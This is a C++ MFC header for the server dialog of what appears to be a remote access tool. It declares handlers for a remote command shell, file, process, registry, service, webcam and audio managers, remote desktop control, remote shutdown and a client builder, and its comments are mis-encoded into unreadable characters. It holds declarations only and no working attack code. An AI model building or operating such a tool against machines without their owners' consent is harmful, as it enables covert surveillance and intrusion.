
// ServerDlg.h : ͷ�ļ�
//

#pragma once
#include "afxcmn.h"
#include "afxwin.h"
#include "TrueColorToolBar.h"
#include "_IOCPServer.h"
#include "ConfigFile.h"

typedef  void  (CALLBACK *LPFNWINDOWNOTIFYPROCEDURE)(PCONTEXT_OBJECT  ContextObject);
typedef struct
{
	char*  TitleData;            //�б������
	int    TitleWidth;           //�б�Ŀ��
}COLUMN_DATA;
// CServerDlg �Ի���
class CServerDlg : public CDialogEx
{
// ����
public:
	CServerDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SERVER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP();
private:
	CBitmap m_Bitmap[30];
	int     m_ConnectionCount;
	CStatusBar  m_StatusBar;
	CTrueColorToolBar m_TrueToolBar;
	NOTIFYICONDATA  m_NotifyIconData;
	USHORT    m_ListenPort;
	ULONG     m_MaxConnection;
public:
	VOID CServerDlg::InitListControl();
	VOID CServerDlg::InitSolidMenu();
	void CServerDlg::ShowDialogMessage(BOOL IsOk, CString  Message);
	void CServerDlg::InitStatusBar();
	void CServerDlg::InitTrueToolBar();

	void CServerDlg::SendingSelectedCommand(PBYTE  BufferData,ULONG BufferLength);
	//��̬����ͨ���������
	void CServerDlg::ServerStart();
	//�������
	void CServerDlg::InitNotifyIconData();
	afx_msg void OnNotifyIconData(WPARAM wPARAM,LPARAM lParam);
	//���ڻص�
	static  void  CALLBACK  WindowNotifyProcedure(PCONTEXT_OBJECT  ContextObject);
	static  void    WindowHandleIO(CONTEXT_OBJECT*  ContextObject);

	/*************************************************************/
	/*���BUTTON����Ϣ����                                       */
	/*************************************************************/
	//�ն˹���
	afx_msg void OnOpenCmdManager();
	afx_msg LRESULT OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam);
	//���̹���
	afx_msg void OnOpenProcessManager();
	afx_msg LRESULT OnProcessManager(WPARAM wParam, LPARAM lParam);
	//���ڹ���
	afx_msg void OnOpenWindowManager();
	afx_msg LRESULT OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam);
	//Զ�̿���
	afx_msg void OnOpenRemoteControl(); 
	afx_msg LRESULT OnRemoteControlDialog(WPARAM wParam, LPARAM lParam);
	//�ļ�����
	afx_msg void OnOpenFileManager();
	afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam);
	//��������
	afx_msg void OnOpenAudioManager();
	afx_msg LRESULT OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam);
	//ϵͳ����
	afx_msg void OnOpenCleanManager();
	//��Ƶ����
	afx_msg void OnOpenVideoManager();
	afx_msg LRESULT OnOpenVideoManagerDialog(WPARAM wParam, LPARAM lParam);
	//�������
	afx_msg void OnOpenServiceManager();
	afx_msg LRESULT OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam);
	//ע������
	afx_msg void OnOpenRegisterManager();
	afx_msg LRESULT OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam);
	//���������
	afx_msg void OnOpenServerManager();
	//�ͻ��˹���
	afx_msg void OnOpenCreateClient();
	//����
	afx_msg void OnOpenServerAbout();

	//�ͻ���������Ϣ����
	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	void  AddCtrlListServerOnline(CString ClientAddress, CString  HostName,
		CString  OSName, CString  ProcessorNameString, CString IsWebCameraExist,
		CString  WebSpeed, CONTEXT_OBJECT* ContextObject);

	//��ͻ���Զ����Ϣ
	afx_msg LRESULT OnRemoteMessageManager(WPARAM wParam, LPARAM lParam);
public:
	CListCtrl m_CListCtrl_Server_Dialog_Online;
	CListCtrl m_CListCtrl_Server_Dialog_Message;
	afx_msg void OnMenuServerDialogSet();
	afx_msg void OnMenuServerDialogExit();
	afx_msg void OnMenuServerDialogAdd();
	afx_msg void OnNMRClickListServerDialogOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnMenuListServerDialogOnlineDisconnection();
	afx_msg void OnMenuListServerDialogOnlineMessage();
	afx_msg void OnMenuListServerDialogOnlineShutdown();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnNotifyicondataShow();
	afx_msg void OnNotifyicondataExit();
	afx_msg void OnTimer(UINT_PTR nIDEvent);
};
